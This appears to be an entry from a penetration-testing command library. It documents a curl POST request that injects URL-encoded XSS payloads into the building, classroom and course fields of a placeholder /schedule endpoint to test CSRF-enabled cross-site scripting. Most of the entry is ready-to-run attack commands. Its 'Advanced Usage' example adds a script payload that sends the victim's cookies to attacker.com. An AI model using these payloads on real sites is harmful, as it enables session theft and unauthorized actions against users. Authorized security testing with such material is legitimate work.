---
id: cmd-uuid-1
data: >-
  curl -X POST https://target.com/schedule -H "Content-Type:
  application/x-www-form-urlencoded" -H "Cookie: session=value" -d
  "schedule-building=%22%3E%3Cimg+src%3Dx+onerror%3Dalert(document.domain)%3E&schedule-classroom=%22%3E%3Cimg+src%3Dx+onerror%3Dalert(document.domain)%3E&schedule-course=%22%3E%3Cimg+src%3Dx+onerror%3Dalert(document.domain)%3E"
tags:
  - csrf
  - xss
  - http
type: command
output: null
executor: curl
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:27:43.208Z'
verified: false
validated: true
submitted: true
---
# send-csrf-xss-post-request

## Command

```bash
curl -X POST https://target.com/schedule \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "Cookie: session=value" \
  -d "schedule-building=%22%3E%3Cimg+src%3Dx+onerror%3Dalert(document.domain)%3E&schedule-classroom=%22%3E%3Cimg+src%3Dx+onerror%3Dalert(document.domain)%3E&schedule-course=%22%3E%3Cimg+src%3Dx+onerror%3Dalert(document.domain)%3E"
```

## Description

This command sends a POST request to a vulnerable endpoint with URL-encoded XSS payloads in form parameters to test CSRF-enabled XSS injection, simulating an unauthorized submission.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies POST method | Yes |
| `-H "Content-Type: ..."` | Sets form-urlencoded content type | Yes |
| `-H "Cookie: ..."` | Includes session cookie for authentication | Yes |
| `-d "..."` | Form data with encoded payloads in building, classroom, course fields | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://target.com/schedule -H "Content-Type: application/x-www-form-urlencoded" -d "schedule-building=%22%3E%3Cimg+src%3Dx+onerror%3Dalert(1)%3E"
```

### Advanced Usage

```bash
curl -X POST https://target.com/schedule -H "Content-Type: application/x-www-form-urlencoded" -H "Cookie: JSESSIONID=abc123" -d "schedule-building=%22%3E%3Cimg+src%3Dx+onerror%3Dalert(document.domain)%3E&schedule-classroom=%22%3E%3Cscript%3Efetch('https://attacker.com?cookie='+document.cookie)%3C/script%3E"
```

## Expected Output

HTTP 200 OK response from server, no CSRF error. On subsequent page load or if reflected, JavaScript executes (e.g., alert shows domain or data exfiltrates).

## Related

- [[Related Procedure: Identify-and-Test-CSRF-and-XSS-in-POST-Endpoint]]
